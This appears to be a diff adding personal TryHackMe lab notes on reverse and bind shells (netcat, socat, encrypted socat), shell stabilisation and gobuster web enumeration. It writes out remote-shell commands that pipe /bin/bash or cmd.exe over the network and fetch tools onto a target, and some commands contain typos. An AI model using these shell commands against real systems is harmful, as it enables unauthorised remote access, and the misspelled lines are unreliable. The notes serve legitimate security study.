@@ -126,5 +126,88 @@ THM{Dont_take_cookies_from_strangers}
 
 
 
+## What the Shell 
+
+[site](https://tryhackme.com/room/introtoshells)
+
+- Tools to access shells:
+    - netcat
+    - socat
+    - metasploit
+    - msfvenom
+- Difference between reverse shells and bind shells:
+    * reverse shells: execute back to our computer
+    * bind shells: execute code on target's computer
+- How to make reverse shell attack:
+    - We need to establish a connection between our computer and target
+    - our computer: `sudo nc - lvpn 443`
+    - target's computer: `nc <local-ip> <port> -e /bin/bash`
+- How to make bind shell attacks: (we assume that there is already a connection)
+    - our computer: `nc <machine_ip> <port>`
+    - target's computer: `nc -lvpn -e "cmd.exe"`
+- Stabilizing shell:
+    - with Python: `python -c 'import pty;pty.spwan("/bin/bash")'`; 'stty'
+    - using 'rlwrap': `rlwrap nc -lvpn <port>; ssty raw -echo; fg`
+    - using 'socat': `sudo python3 -m http.server 80; wget <local-ip>/socat -O /tmp/socat`
+- Socat:
+    - `socat TCP-L:<port>`
+    - Encrypted shells:
+	- `openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt; cat shell.key shell.crt > shell.pem; socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -`
+	- `socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash`
+
+- Passing arguments:
+    - pty:
+    - stderr
+    - sigint
+    - setsid
+    - sane
+- `mkfifo`
+
+
+[reverse shell cheat sheet](https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
+[payloads ](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
+
+```
+>>> socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 EXEC:/bin/bash (erronous)
+>>> socat OPENSSL:10.10.10.5:53,verify=0 
+
+
+```
+
+- msfvenom
+
+
+## Web Enumeration
+
+[site](https://tryhackme.com/room/webenumerationv2)
+
+- Gobuster modes:
+    - dir: enumerate website directories
+    - dns: brute forcing subdomains
+    - vhost: brute force virtual hosts
+- 
+
+**Gobuster**
+```
+>>> gobuster -u http://10.10.28.255 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-1.0.txt -t 64
+images,Changes,VIDEO
+>>> gobuster -u http://10.10.28.255/Changes -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-1.0.txt -x html,js,conf,txt
+>>>  
+```
+
+**wpscan**
+
+
+**nikto**
+
+
+## Upload Vulnerabilities
+
+- adding hosts: `sudo /etc/hosts`
+
+
+```
+
+```
 
 
